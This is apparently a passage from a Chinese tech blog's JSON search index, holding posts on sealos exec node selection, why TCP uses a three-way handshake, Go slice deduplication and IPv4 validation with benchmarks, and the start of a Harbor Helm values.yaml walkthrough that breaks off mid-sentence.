Use \u0026ndash;label if label not exist\n$ ./sealos exec --cmd \u0026quot;hostname -i\u0026quot; --node huohua-test --label node-role.kubernete. 12:48:25 [EROR] [exec.go:53] get ips err: unable to parse requirement: invalid label key \u0026quot;node-role.kubernete.\u0026quot;: name part must consist of alphanumeric characters, '-', '_' or '.', and must start and end with an alphanumeric character (e.g. 'MyName', or 'my.name', or '123-abc', regex used for validation is '([A-Za-z0-9][-A-Za-z0-9_.]*)?[A-Za-z0-9]') $ ./sealos exec --cmd \u0026quot;hostname -i\u0026quot; --node huohua-test --label node-role.kubernete 12:48:42 [EROR] [exec.go:53] get ips err: label node-role.kubernete is not fount in kubernetes nodes 使用 --node时, node不存在 Use --node if node not exist in kuernetes\n12:50:05 [INFO] [ssh.go:50] [192.168.0.88] server88-new 12:50:05 [INFO] [ssh.go:50] [192.168.0.30] huohua-test 12:50:05 [INFO] [ssh.go:50] [192.168.0.65] server65 12:50:05 [INFO] [ssh.go:50] [192.168.0.31] k8s-master ## this will output nothing $ ./sealos exec --cmd \u0026quot;hostname -i\u0026quot; --node huohua-test031 ## only exec on exsit nodes. ./sealos exec --cmd \u0026quot;hostname -i\u0026quot; --node huohua-test031 --node 192.168.0.65 12:51:28 [INFO] [ssh.go:57] [ssh][192.168.0.65] cd /tmp \u0026amp;\u0026amp; hostname -i 12:51:29 [INFO] [ssh.go:50] [192.168.0.65] 192.168.0.65 ## when nodes ip is format but is not in kubernetes, will appear ssh session error , timeout. $ ./sealos exec --cmd \u0026quot;hostname -i\u0026quot; --node huohua-test031 --node 192.168.9.65 12:52:14 [INFO] [ssh.go:57] [ssh][192.168.9.65] cd /tmp \u0026amp;\u0026amp; hostname -i 12:53:14 [EROR] [ssh.go:60] [ssh][192.168.9.65]Error create ssh session failed,dial tcp 192.168.9.65:22: i/o timeout 支持kubernetes label的逻辑表达式. support kubernetes label exp like kubernetes.io/arch!=amd64\n$ kubectl get nodes --show-labels NAME STATUS ROLES AGE VERSION LABELS huohua-test Ready \u0026lt;none\u0026gt; 93d v1.18.3 beta.kubernetes.io/arch=amd64,beta.kubernetes.io/os=linux,kubernetes.io/arch=amd64,kubernetes.io/hostname=huohua-test,kubernetes.io/os=linux,name=huohua k8s-master Ready master 93d v1.18.3 beta.kubernetes.io/arch=amd64,beta.kubernetes.io/os=linux,kubernetes.io/arch=amd64,kubernetes.io/hostname=k8s-master,kubernetes.io/os=linux,node-role.kubernetes.io/master= server65 Ready \u0026lt;none\u0026gt; 89d v1.18.3 beta.kubernetes.io/arch=amd64,beta.kubernetes.io/os=linux,kubernetes.io/arch=amd64,kubernetes.io/hostname=server65,kubernetes.io/os=linux server88-new Ready \u0026lt;none\u0026gt; 89d v1.18.3 beta.kubernetes.io/arch=amd64,beta.kubernetes.io/os=linux,kubernetes.io/arch=amd64,kubernetes.io/hostname=server88-new,kubernetes.io/os=linux,name=front $ ./sealos exec --cmd \u0026#34;hostname -i\u0026#34; --label name!=front 09:17:21 [INFO] [ssh.go:57] [ssh][192.168.0.65] cd /tmp \u0026amp;\u0026amp; hostname -i 09:17:21 [INFO] [ssh.go:57] [ssh][192.168.0.30] cd /tmp \u0026amp;\u0026amp; hostname -i 09:17:21 [INFO] [ssh.go:57] [ssh][192.168.0.31] cd /tmp \u0026amp;\u0026amp; hostname -i 09:17:21 [INFO] [ssh.go:50] [192.168.0.30] 192.168.0.30 09:17:21 [INFO] [ssh.go:50] [192.168.0.65] 192.168.0.65 09:17:21 [INFO] [ssh.go:50] [192.168.0.31] 192.168.0.31 ","permalink":"https://www.fenghong.tech/blog/kubernetes/sealos-etcd-backup-exec/","tags":["etcd","backup","exec"],"title":"sealos etcd及exec子命令使用相关"},{"categories":["tools"],"contents":"[TOC]\n为什么 TCP 建立连接需要三次握手 文章源链接： 为什么这么设计系统设计TCP三次握手\n 为什么这么设计（Why’s THE Design）是一系列关于计算机领域中程序设计决策的文章，我们在这个系列的每一篇文章中都会提出一个具体的问题并从不同的角度讨论这种设计的优缺点、对具体实现造成的影响。如果你有想要了解的问题，可以在文章下面留言。\n TCP 协议是我们几乎每天都会接触到的网络协议，绝大多数网络连接的建立都是基于 TCP 协议的，学过计算机网络或者对 TCP 协议稍有了解的人都知道 —— 使用 TCP 协议建立连接需要经过三次握手（three-way handshake）。\n如果让我们简单说说 TCP 建立连接的过程，相信很多准备过面试的人都会非常了解，但是一旦想要深究『为什么 TCP 建立连接需要三次握手？』，作者相信大多数人都没有办法回答这个问题或者会给出错误的答案，这边文章就会讨论究竟为什么我们需要三次握手才能建立 TCP 连接？\n 需要注意的是我们会将重点放到为什么需要 TCP 建立连接需要**『三次握手』**，而*不仅仅*是为什么需要**『三次』**握手。\n 概述 在具体分析今天的问题之前，我们首先可以了解一下最常见的错误类比，这个对 TCP 连接过程的错误比喻误导了很多人，作者在比较长的一段时间内也认为它能够很好地描述 TCP 建立连接为什么需要三次握手：\n 你听得到吗？ 我能听到，你听得到？ 我也能听到；  这种用类比来解释问题往往就会面临『十个类比九个错』的尴尬局面，如果别人用类比回答你的为什么，你需要仔细想一想它的类比里究竟哪里有漏洞；类比带来的解释往往只能有片面的相似性，我们永远也无法找到绝对正确的类比，它只在我们想要通俗易懂地展示事物的特性时才能发挥较大的作用，我们在文章的后面会介绍为什么这里的类比有问题，各位读者也可以带着疑问来阅读剩下的内容。\n很多人尝试回答或者思考这个问题的时候其实关注点都放在了三次握手中的三次上面，这确实很重要，但是如果重新审视这个问题，我们对于『什么是连接』真的清楚？只有知道连接的定义，我们才能去尝试回答为什么 TCP 建立连接需要三次握手。\n The reliability and flow control mechanisms described above require that TCPs initialize and maintain certain status information for each data stream. The combination of this information, including sockets, sequence numbers, and window sizes, is called a connection.\n RFC 793 - Transmission Control Protocol 文档中非常清楚地定义了 TCP 中的连接是什么，我们简单总结一下：用于保证可靠性和流控制机制的信息，包括 Socket、序列号以及窗口大小叫做连接。\n所以，建立 TCP 连接就是通信的双方需要对上述的三种信息达成共识，连接中的一对 Socket 是由互联网地址标志符和端口组成的，窗口大小主要用来做流控制，最后的序列号是用来追踪通信发起方发送的数据包序号，接收方可以通过序列号向发送方确认某个数据包的成功接收。\n到这里，我们将原有的问题转换成了『为什么需要通过三次握手才可以初始化 Sockets、窗口大小和初始序列号？』，那么接下来我们就开始对这个细化的问题进行分析并寻找解释。\n设计 这篇文章主要会从以下几个方面介绍为什么我们需要通过三次握手才可以初始化 Sockets、窗口大小、初始序列号并建立 TCP 连接：\n 通过三次握手才能阻止重复历史连接的初始化； 通过三次握手才能对通信双方的初始序列号进行初始化； 讨论其他次数握手建立连接的可能性；  这几个论点中的第一个是 TCP 选择使用三次握手的最主要原因，其他的几个原因相比之下都是次要的原因，我们在这里对它们的讨论只是为了让整个视角更加丰富，通过多方面理解这一有趣的设计决策。\n历史连接 RFC 793 - Transmission Control Protocol 其实就指出了 TCP 连接使用三次握手的首要原因 —— 为了阻止历史的重复连接初始化造成的混乱问题，防止使用 TCP 协议通信的双方建立了错误的连接。\n The principle reason for the three-way handshake is to prevent old duplicate connection initiations from causing confusion.\n 想象一下这个场景，如果通信双方的通信次数只有两次，那么发送方一旦发出建立连接的请求之后它就没有办法撤回这一次请求，如果在网络状况复杂或者较差的网络中，发送方连续发送多次建立连接的请求，如果 TCP 建立连接只能通信两次，那么接收方只能选择接受或者拒绝发送方发起的请求，它并不清楚这一次请求是不是由于网络拥堵而早早过期的连接。\n所以，TCP 选择使用三次握手来建立连接并在连接引入了 RST 这一控制消息，接收方当收到请求时会将发送方发来的 SEQ+1 发送给对方，这时由发送方来判断当前连接是否是历史连接：\n 如果当前连接是历史连接，即 SEQ 过期或者超时，那么发送方就会直接发送 RST 控制消息中止这一次连接； 如果当前连接不是历史连接，那么发送方就会发送 ACK 控制消息，通信双方就会成功建立连接；  使用三次握手和 RST 控制消息将是否建立连接的最终控制权交给了发送方，因为只有发送方有足够的上下文来判断当前连接是否是错误的或者过期的，这也是 TCP 使用三次握手建立连接的最主要原因。\n初始序列号 另一个使用三次握手的重要的原因就是通信双方都需要获得一个用于发送信息的初始化序列号，作为一个可靠的传输层协议，TCP 需要在不稳定的网络环境中构建一个可靠的传输层，网络的不确定性可能会导致数据包的缺失和顺序颠倒等问题，常见的问题可能包括：\n 数据包被发送方多次发送造成数据的重复； 数据包在传输的过程中被路由或者其他节点丢失； 数据包到达接收方可能无法按照发送顺序；  为了解决上述这些可能存在的问题，TCP 协议要求发送方在数据包中加入『序列号』字段，有了数据包对应的序列号，我们就可以：\n 接收方可以通过序列号对重复的数据包进行去重； 发送方会在对应数据包未被 ACK 时进行重复发送； 接收方可以根据数据包的序列号对它们进行重新排序；  序列号在 TCP 连接中有着非常重要的作用，初始序列号作为 TCP 连接的一部分也需要在三次握手期间进行初始化，由于 TCP 连接通信的双方都需要获得初始序列号，所以它们其实需要向对方发送 SYN 控制消息并携带自己期望的初始化序列号 SEQ，对方在收到 SYN 消息之后会通过 ACK 控制消息以及 SEQ+1 来进行确认。\n如上图所示，通信双方的两个 TCP A/B 分别向对方发送 SYN 和 ACK 控制消息，等待通信双方都获取到了自己期望的初始化序列号之后就可以开始通信了，由于 TCP 消息头的设计，我们可以将中间的两次通信合成一个，TCP B 可以向 TCP A 同时发送 ACK 和 SYN 控制消息，这也就帮助我们将四次通信减少至三次。\n A three way handshake is necessary because sequence numbers are not tied to a global clock in the network, and TCPs may have different mechanisms for picking the ISN’s. The receiver of the first SYN has no way of knowing whether the segment was an old delayed one or not, unless it remembers the last sequence number used on the connection (which is not always possible), and so it must ask the sender to verify this SYN. The three way handshake and the advantages of a clock-driven scheme are discussed in [3].\n 除此之外，网络作为一个分布式的系统，其中并不存在一个用于计数的全局时钟，而 TCP 可以通过不同的机制来初始化序列号，作为 TCP 连接的接收方我们无法判断对方传来的初始化序列号是否过期，所以我们需要交由对方来判断，TCP 连接的发起方可以通过保存发出的序列号判断连接是否过期，如果让接收方来保存并判断序列号却是不现实的，这也再一次强化了我们在上一节中提出的观点 —— 避免历史错连接的初始化。\n通信次数 当我们讨论 TCP 建立连接需要的通信次数时，我们经常会执着于为什么通信三次才可以建立连接，而不是两次或者四次；讨论使用更多的通信次数来建立连接往往是没有意义的，因为我们总可以使用更多的通信次数交换相同的信息，所以使用四次、五次或者更多次数建立连接在技术上都是完全可以实现的。\n这种增加 TCP 连接通信次数的问题往往没有讨论的必要性，我们追求的其实是用更少的通信次数（理论上的边界）完成信息的交换，也就是为什么我们在上两节中也一再强调使用『两次握手』没有办法建立 TCP 连接，使用三次握手是建立连接所需要的最小次数。\n总结 我们在这篇文章中讨论了为什么 TCP 建立连接需要经过三次握手，在具体分析这个问题之前，我们首先重新思考了 TCP 连接究竟是什么，RFC 793 - Transmission Control Protocol - IETF Tools 对 TCP 连接有着非常清楚的定义 —— 用于保证可靠性和流控制机制的数据，包括 Socket、序列号以及窗口大小。\nTCP 建立连接时通过三次握手可以有效地避免历史错误连接的建立，减少通信双方不必要的资源消耗，三次握手能够帮助通信双方获取初始化序列号，它们能够保证数据包传输的不重不丢，还能保证它们的传输顺序，不会因为网络传输的问题发生混乱，到这里不使用『两次握手』和『四次握手』的原因已经非常清楚了：\n 『两次握手』：无法避免历史错误连接的初始化，浪费接收方的资源； 『四次握手』：TCP 协议的设计可以让我们同时传递 ACK 和 SYN 两个控制信息，减少了通信次数，所以不需要使用更多的通信次数传输相同的信息；  我们重新回到在文章开头提的问题，为什么使用类比解释 TCP 使用三次握手是错误的？这主要还是因为，这个类比没有解释清楚核心问题 —— 避免历史上的重复连接。到最后，我们还是来看一些比较开放的相关问题，有兴趣的读者可以仔细想一下下面的问题：\n 除了使用序列号是否还有其他方式保证消息的不重不丢？ UDP 协议有连接的概念么，它能保证数据传输的可靠么？   如果对文章中的内容有疑问或者想要了解更多软件工程上一些设计决策背后的原因，可以在博客下面留言，作者会及时回复本文相关的疑问并选择其中合适的主题作为后续的内容。\n Reference  RFC 793 - Transmission Control Protocol - IETF Tools Why do we need a 3-way handshake? Why not just 2-way?  ","permalink":"https://www.fenghong.tech/blog/technology/why-tcp-three-way-hanshake/","tags":["ops"],"title":"为什么 TCP 建立连接需要三次握手"},{"categories":["algorithm","golang"],"contents":"[TOC]\n问题描述： 在写sealos exec的时候， 有个需求是对用户输入的ip和hostname进行操作， 逻辑是将hostname转为ip来操作; 在一个slice里面，要区分两者的话， 就要去重和去去除元素。 因此有了这两个算法。\n解决思路 删除元素的算法及对比 // remove is remove b in a []string func remove(a []string, b string) []string { if len(a) == 0 { return a } for i, v := range a { if v == b { a = append(a[:i], a[i+1:]...) return remove(a, b) break } } return a } // func removeByreUse(a []string, b string) []string { if len(a) == 0 { return a } res := a[:0] for _, v := range a { if v != b { res = append(res, v) } } return res } 测试函数\nfunc Test_remove(t *testing.T) { type args struct { a []string b string } tests := []struct { name string args args want []string }{ {\u0026quot;test01\u0026quot;, args{ a: []string{\u0026quot;123\u0026quot;, \u0026quot;245\u0026quot;, \u0026quot;345\u0026quot;}, b: \u0026quot;123\u0026quot;, }, []string{\u0026quot;245\u0026quot;, \u0026quot;345\u0026quot;}}, {\u0026quot;test02\u0026quot;, args{ a: []string{\u0026quot;123\u0026quot;, \u0026quot;245\u0026quot;, \u0026quot;345\u0026quot;, \u0026quot;123\u0026quot;, \u0026quot;245\u0026quot;, \u0026quot;345\u0026quot;, \u0026quot;123\u0026quot;, \u0026quot;245\u0026quot;, \u0026quot;345\u0026quot;}, b: \u0026quot;123\u0026quot;, }, []string{\u0026quot;245\u0026quot;, \u0026quot;345\u0026quot;, \u0026quot;245\u0026quot;, \u0026quot;345\u0026quot;, \u0026quot;245\u0026quot;, \u0026quot;345\u0026quot;}}, } for _, tt := range tests { t.Run(tt.name, func(t *testing.T) { if got := remove(tt.args.a, tt.args.b); !reflect.DeepEqual(got, tt.want) { t.Errorf(\u0026quot;remove() = %v, want %v\u0026quot;, got, tt.want) } }) } } func Test_removeByUse(t *testing.T) { type args struct { a []string b string } tests := []struct { name string args args want []string }{ {\u0026quot;test01\u0026quot;, args{ a: []string{\u0026quot;123\u0026quot;, \u0026quot;245\u0026quot;, \u0026quot;345\u0026quot;}, b: \u0026quot;123\u0026quot;, }, []string{\u0026quot;245\u0026quot;, \u0026quot;345\u0026quot;}}, {\u0026quot;test02\u0026quot;, args{ a: []string{\u0026quot;123\u0026quot;, \u0026quot;245\u0026quot;, \u0026quot;345\u0026quot;, \u0026quot;123\u0026quot;, \u0026quot;245\u0026quot;, \u0026quot;345\u0026quot;, \u0026quot;123\u0026quot;, \u0026quot;245\u0026quot;, \u0026quot;345\u0026quot;}, b: \u0026quot;123\u0026quot;, }, []string{\u0026quot;245\u0026quot;, \u0026quot;345\u0026quot;, \u0026quot;245\u0026quot;, \u0026quot;345\u0026quot;, \u0026quot;245\u0026quot;, \u0026quot;345\u0026quot;}}, } for _, tt := range tests { t.Run(tt.name, func(t *testing.T) { if got := removeByreUse(tt.args.a, tt.args.b); !reflect.DeepEqual(got, tt.want) { t.Errorf(\u0026quot;remove() = %v, want %v\u0026quot;, got, tt.want) } }) } } func Benchmark_remove(b *testing.B) { b.ResetTimer() origin := []string{\u0026quot;123\u0026quot;, \u0026quot;245\u0026quot;, \u0026quot;345\u0026quot;, \u0026quot;123\u0026quot;, \u0026quot;245\u0026quot;, \u0026quot;345\u0026quot;, \u0026quot;123\u0026quot;, \u0026quot;245\u0026quot;, \u0026quot;345\u0026quot;} for i:=0; i\u0026lt;b.N;i++ { remove(origin, \u0026quot;123\u0026quot;) } } func Benchmark_removeByUse(b *testing.B) { b.ResetTimer() origin := []string{\u0026quot;123\u0026quot;, \u0026quot;245\u0026quot;, \u0026quot;345\u0026quot;, \u0026quot;123\u0026quot;, \u0026quot;245\u0026quot;, \u0026quot;345\u0026quot;, \u0026quot;123\u0026quot;, \u0026quot;245\u0026quot;, \u0026quot;345\u0026quot;} for i:=0; i\u0026lt;b.N;i++ { removeByreUse(origin, \u0026quot;123\u0026quot;) } } Benchmark\n$ go test -v -bench=. -benchtime=3s -benchmem === RUN Test_remove === RUN Test_remove/test01 === RUN Test_remove/test02 --- PASS: Test_remove (0.00s) --- PASS: Test_remove/test01 (0.00s) --- PASS: Test_remove/test02 (0.00s) === RUN Test_removeByUse === RUN Test_removeByUse/test01 === RUN Test_removeByUse/test02 --- PASS: Test_removeByUse (0.00s) --- PASS: Test_removeByUse/test01 (0.00s) --- PASS: Test_removeByUse/test02 (0.00s) goos: linux goarch: amd64 pkg: github.com/fanux/sealos/k8s Benchmark_remove Benchmark_remove-4 60721201 54.8 ns/op 0 B/op 0 allocs/op Benchmark_removeByUse Benchmark_removeByUse-4 52462827 65.7 ns/op 0 B/op 0 allocs/op PASS ok github.com/fanux/sealos/k8s 6.921s 去重算法 这里是使用了map来存储了相关信息， 利用map的key的不重复性质。\n// removeRep is Deduplication []string func removeRep(a []string) []string { if len(a) == 0 { return a } res := make([]string, 0, len(a)) tmp := map[string]struct{}{} for _, v := range a { if _, ok := tmp[v]; !ok { tmp[v] = struct{}{} res = append(res, v) } } return res } 测试函数\nfunc Test_removeRep(t *testing.T) { type args struct { a []string } tests := []struct { name string args args want []string }{ {\u0026quot;test01\u0026quot;, args{ a: []string{\u0026quot;123\u0026quot;, \u0026quot;245\u0026quot;, \u0026quot;345\u0026quot;, \u0026quot;345\u0026quot;}, }, []string{\u0026quot;123\u0026quot;, \u0026quot;245\u0026quot;, \u0026quot;345\u0026quot;}}, {\u0026quot;test02\u0026quot;, args{ a: []string{\u0026quot;123\u0026quot;, \u0026quot;245\u0026quot;, \u0026quot;345\u0026quot;, \u0026quot;123\u0026quot;, \u0026quot;245\u0026quot;, \u0026quot;345\u0026quot;, \u0026quot;123\u0026quot;, \u0026quot;245\u0026quot;, \u0026quot;345\u0026quot;}, }, []string{\u0026quot;123\u0026quot;, \u0026quot;245\u0026quot;, \u0026quot;345\u0026quot;}}, } for _, tt := range tests { t.Run(tt.name, func(t *testing.T) { if got := removeRep(tt.args.a); !reflect.DeepEqual(got, tt.want) { t.Errorf(\u0026quot;removeRep() = %v, want %v\u0026quot;, got, tt.want) } }) } } Test结果\n$ go test -v -bench=. -benchtime=3s -benchmem === RUN Test_removeRep === RUN Test_removeRep/test01 === RUN Test_removeRep/test02 --- PASS: Test_removeRep (0.00s) --- PASS: Test_removeRep/test01 (0.00s) --- PASS: Test_removeRep/test02 (0.00s) Benchmark_removeRep Benchmark_removeRep-4 11675400 300 ns/op 144 B/op 1 allocs/op ok github.com/fanux/sealos/k8s 10.617s 判断是否为IPv4的算法 判断ipv4是leetcode地址\nfunc IsIpv4(ip string) bool { //matched, _ := regexp.MatchString(\u0026quot;((2(5[0-5]|[0-4]\\\\d))|[0-1]?\\\\d{1,2})(\\\\.((2(5[0-5]|[0-4]\\\\d))|[0-1]?\\\\d{1,2})){3}\u0026quot;, ip) arr := strings.Split(ip, \u0026quot;.\u0026quot;) if len(arr) != 4 { return false } for _, v := range arr { if v == \u0026quot;\u0026quot; { return false } if len(v) \u0026gt; 1 \u0026amp;\u0026amp; v[0] == '0' { return false } num := 0 for _, c := range v { if c \u0026gt;= '0' \u0026amp;\u0026amp; c \u0026lt;= '9' { num = num*10 + int(c-'0') } else { return false } } if num \u0026gt; 255 { return false } } return true } test函数\nfunc TestIsIpv4(t *testing.T) { type args struct { ip string } tests := []struct { name string args args want bool }{ {\u0026quot;test01\u0026quot;, args{ \u0026quot;192.168.0.1\u0026quot;, }, true}, {\u0026quot;test02\u0026quot;, args{ \u0026quot;192.168.00.1\u0026quot;, }, false}, {\u0026quot;test03\u0026quot;, args{ \u0026quot;dev-master\u0026quot;, }, false}, } for _, tt := range tests { t.Run(tt.name, func(t *testing.T) { if got := IsIpv4(tt.args.ip); got != tt.want { t.Errorf(\u0026quot;IsIp() = %v, want %v\u0026quot;, got, tt.want) } }) } } func BenchmarkIsIpv4(b *testing.B) { b.ResetTimer() origin := \u0026quot;192.168.00.1\u0026quot; for i:=0; i\u0026lt;b.N;i++ { IsIpv4(origin) } } func BenchmarkIsIpv42(b *testing.B) { b.ResetTimer() origin := \u0026quot;192.168.00.1\u0026quot; for i:=0; i\u0026lt;b.N;i++ { _, _ = regexp.MatchString(\u0026quot;((2(5[0-5]|[0-4]\\\\d))|[0-1]?\\\\d{1,2})(\\\\.((2(5[0-5]|[0-4]\\\\d))|[0-1]?\\\\d{1,2})){3}\u0026quot;, origin) } } func BenchmarkIsIpv43(b *testing.B) { b.ResetTimer() origin := \u0026quot;192.168.00.1\u0026quot; for i:=0; i\u0026lt;b.N;i++ { func(ip string) bool { strs := strings.Split(ip, \u0026quot;.\u0026quot;) if len(strs) != 4 { return false } for _, s := range strs { if len(s) == 0 || (len(s) \u0026gt; 1 \u0026amp;\u0026amp; s[0] == '0') { return false } if s[0] \u0026lt; '0' || s[0] \u0026gt; '9' { return false } n, err := strconv.Atoi(s) if err != nil { return false } if n \u0026lt; 0 || n \u0026gt; 255 { return false } } return true } (origin) } } Benchmark, 使用正则的速度是最慢的。\n=== RUN TestIsIpv4 === RUN TestIsIpv4/test01 === RUN TestIsIpv4/test02 === RUN TestIsIpv4/test03 --- PASS: TestIsIpv4 (0.00s) --- PASS: TestIsIpv4/test01 (0.00s) --- PASS: TestIsIpv4/test02 (0.00s) --- PASS: TestIsIpv4/test03 (0.00s) goos: linux goarch: amd64 pkg: github.com/fanux/sealos/k8s BenchmarkIsIpv4 BenchmarkIsIpv4-4 25295156\t142 ns/op\t64 B/op 1 allocs/op BenchmarkIsIpv42 BenchmarkIsIpv42-4 183339\t19405 ns/op\t18450 B/op 100 allocs/op BenchmarkIsIpv43 BenchmarkIsIpv43-4 24223809\t147 ns/op\t64 B/op 1 allocs/op PASS ok github.com/fanux/sealos/k8s\t22.042s 参考  leetcode  ","permalink":"https://www.fenghong.tech/blog/algorithm/go-slice-deduplicate/","tags":["go","algorithm"],"title":"go实现对slice的去重并移除元素"},{"categories":["kubernetes"],"contents":"[TOC]\n Harbor 支持多种安装方式，源码目录下面默认有一个安装脚本（make/install.sh），采用 docker-compose 的形式运行 Harbor 各个组件,以前写的一个使用docker-compose部署的, 这次使用helm部署. 并实现https访问.\n 安装harbor 首先下载 Harbor Chart 包到要安装的集群上：\n$ git clone https://github.com/goharbor/harbor-helm $ cd harbor-helm $ git checkout 1.4.2 配置文件解析 安装 Helm Chart 包最重要的当然是values.yaml文件了，我们可以通过覆盖该文件中的属性来改变配置：\nexpose: # 设置暴露服务的方式。将类型设置为 ingress、clusterIP或nodePort并补充对应部分的信息。 type: ingress tls: # 是否开启 tls，注意：如果类型是 ingress 并且tls被禁用，则在pull/push镜像时，则必须包含端口。详细查看文档：https://github.com/goharbor/harbor/issues/5291。 enabled: true # 如果你想使用自己的 TLS 证书和私钥，请填写这个 secret 的名称，这个 secret 必须包含名为 tls.crt 和 tls.key 的证书和私钥文件，如果没有设置则会自动生成证书和私钥文件。 secretName: \u0026quot;fenghong\u0026quot; # 默认 Notary 服务会使用上面相同的证书和私钥文件，如果你想用一个独立的则填充下面的字段，注意只有类型是 ingress 的时候才需要。 notarySecretName: \u0026quot;\u0026quot; # common name 是用于生成证书的，当类型是 clusterIP 或者 nodePort 并且 secretName 为空的时候才需要 commonName: \u0026quot;\u0026quot; ingress: hosts: core: harbor.fenghong.cn notary: notary.fenghong.tech # set to the type of ingress controller if it has specific requirements. # leave as `default` for most ingress controllers. # set to `gce` if using the GCE ingress controller # set to `ncp` if using the NCP (NSX-T Container Plugin) ingress controller controller: default annotations: ingress.kubernetes.io/ssl-redirect: \u0026quot;true\u0026quot; ingress.kubernetes.io/proxy-body-size: \u0026quot;0\u0026quot; nginx.ingress.kubernetes.io/ssl-redirect: \u0026quot;true\u0026quot; nginx.ingress.kubernetes.io/proxy-body-size: \u0026quot;0\u0026quot; # Harbor 核心服务外部访问 URL。主要用于： # 1) 补全 portal 页面上面显示的 docker/helm 命令 # 2) 补全返回给 docker/notary 客户端的 token 服务 URL # 格式：protocol://domain[:port]。 # 1) 如果 expose.type=ingress，\u0026quot;domain\u0026quot;的值就是 expose.ingress.hosts.core 的值 # 2) 如果 expose.type=clusterIP，\u0026quot;domain\u0026quot;的值就是 expose.clusterIP.name 的值 # 3) 如果 expose.type=nodePort，\u0026quot;domain\u0026quot;的值就是 k8s 节点的 IP 地址 # 如果在代理后面部署 Harbor，请将其设置为代理的 URL externalURL: https://harbor.fenghong.cn # harbor各组件之间的TLS. 基本可以不用的. internalTLS: enabled: false certSource: \u0026quot;auto\u0026quot; # The content of trust ca, only available when `certSource` is \u0026quot;manual\u0026quot; trustCa: \u0026quot;\u0026quot; # core related cert configuration core: # secret name for core's tls certs secretName: \u0026quot;\u0026quot; # Content of core's TLS cert file, only available when `certSource` is \u0026quot;manual\u0026quot; crt: \u0026quot;\u0026quot; # Content of core's TLS key file, only available when `certSource` is \u0026quot;manual\u0026quot; key: \u0026quot;\u0026quot; # jobservice related cert configuration jobservice: # secret name for jobservice's tls certs secretName: \u0026quot;\u0026quot; # Content of jobservice's TLS key file, only available when `certSource` is \u0026quot;manual\u0026quot; crt: \u0026quot;\u0026quot; # Content of jobservice's TLS key file, only available when `certSource` is \u0026quot;manual\u0026quot; key: \u0026quot;\u0026quot; # registry related cert configuration registry: # secret name for registry's tls certs secretName: \u0026quot;\u0026quot; # Content of registry's TLS key file, only available when `certSource` is \u0026quot;manual\u0026quot; crt: \u0026quot;\u0026quot; # Content of registry's TLS key file, only available when `certSource` is \u0026quot;manual\u0026quot; key: \u0026quot;\u0026quot; # portal related cert configuration portal: # secret name for portal's tls certs secretName: \u0026quot;\u0026quot; # Content of portal's TLS key file, only available when `certSource` is \u0026quot;manual\u0026quot; crt: \u0026quot;\u0026quot; # Content of portal's TLS key file, only available when `certSource` is \u0026quot;manual\u0026quot; key: \u0026quot;\u0026quot; # chartmuseum related cert configuration chartmuseum: # secret name for chartmuseum's tls certs secretName: \u0026quot;\u0026quot; # Content of chartmuseum's TLS key file, only available when `certSource` is \u0026quot;manual\u0026quot; crt: \u0026quot;\u0026quot; # Content of chartmuseum's TLS key file, only available when `certSource` is \u0026quot;manual\u0026quot; key: \u0026quot;\u0026quot; # clair related cert configuration clair: # secret name for clair's tls certs secretName: \u0026quot;\u0026quot; # Content of clair's TLS key file, only available when `certSource` is \u0026quot;manual\u0026quot; crt: \u0026quot;\u0026quot; # Content of clair's TLS key file, only available when `certSource` is \u0026quot;manual\u0026quot; key: \u0026quot;\u0026quot; # trivy related cert configuration trivy: # secret name for trivy's tls certs secretName: \u0026quot;\u0026quot; # Content of trivy's TLS key file, only available when `certSource` is \u0026quot;manual\u0026quot; crt: \u0026quot;\u0026quot; # Content of trivy's TLS key file, only available when `certSource` is \u0026quot;manual\u0026quot; key: \u0026quot;\u0026quot; # 默认情况下开启数据持久化，在k8s集群中需要动态的挂载卷默认需要一个StorageClass对象。 # 如果你有已经存在可以使用的持久卷，需要在\u0026quot;storageClass\u0026quot;中指定你的 storageClass 或者设置 \u0026quot;existingClaim\u0026quot;。 # # 对于存储 docker 镜像和 Helm charts 包，你也可以用 \u0026quot;azure\u0026quot;、\u0026quot;gcs\u0026quot;、\u0026quot;s3\u0026quot;、\u0026quot;swift\u0026quot; 或者 \u0026quot;oss\u0026quot;，直接在 \u0026quot;imageChartStorage\u0026quot; 区域设置即可 persistence: enabled: true # Setting it to \u0026quot;keep\u0026quot; to avoid removing PVCs during a helm delete # operation. Leaving it empty will delete PVCs after the chart deleted resourcePolicy: \u0026quot;keep\u0026quot; persistentVolumeClaim: registry: # 使用一个存在的 PVC(必须在绑定前先手动创建) existingClaim: \u0026quot;\u0026quot; # 指定\u0026quot;storageClass\u0026quot;，或者使用默认的 StorageClass 对象，设置成\u0026quot;-\u0026quot;禁用动态分配挂载卷 storageClass: \u0026quot;nfs\u0026quot; subPath: \u0026quot;\u0026quot; accessMode: ReadWriteOnce size: 2Gi chartmuseum: existingClaim: \u0026quot;\u0026quot; storageClass: \u0026quot;nfs\u0026quot; subPath: \u0026quot;\u0026quot; accessMode: ReadWriteOnce size: 2Gi jobservice: existingClaim: \u0026quot;\u0026quot; storageClass: \u0026quot;nfs\u0026quot; subPath: \u0026quot;\u0026quot; accessMode: ReadWriteOnce size: 1Gi # 如果使用外部的数据库服务，下面的设置将会被忽略 database: existingClaim: \u0026quot;\u0026quot; storageClass: \u0026quot;\u0026quot; subPath: \u0026quot;\u0026quot; accessMode: ReadWriteOnce size: 1Gi # 如果使用外部的 Redis 服务，下面的设置将会被忽略 redis: existingClaim: \u0026quot;\u0026quot; storageClass: \u0026quot;nfs\u0026quot; subPath: \u0026quot;\u0026quot; accessMode: ReadWriteOnce size: 1Gi trivy: existingClaim: \u0026quot;\u0026quot; storageClass: \u0026quot;nfs\u0026quot; subPath: \u0026quot;\u0026quot; accessMode: ReadWriteOnce size: 2Gi # 定义使用什么存储后端来存储镜像和 charts 包，详细文档地址：https://github.com/docker/distribution/blob/master/docs/configuration.md#storage imageChartStorage: # 指定存储类型：\u0026quot;filesystem\u0026quot;, \u0026quot;azure\u0026quot;, \u0026quot;gcs\u0026quot;, \u0026quot;s3\u0026quot;, \u0026quot;swift\u0026quot;, \u0026quot;oss\u0026quot;，在相应的区域填上对应的信息。 # 如果你想使用 pv 则必须设置成\u0026quot;filesystem\u0026quot;类型 type: filesystem filesystem: rootdirectory: /storage #maxthreads: 100 imagePullPolicy: IfNotPresent # Use this set to assign a list of default pullSecrets imagePullSecrets: # - name: docker-registry-secret # - name: internal-registry-secret updateStrategy: type: RollingUpdate # debug, info, warning, error or fatal logLevel: info # Harbor admin 初始密码，Harbor 启动后通过 Portal 修改该密码 harborAdminPassword: \u0026quot;Harbor12345\u0026quot; # 用于加密的一个 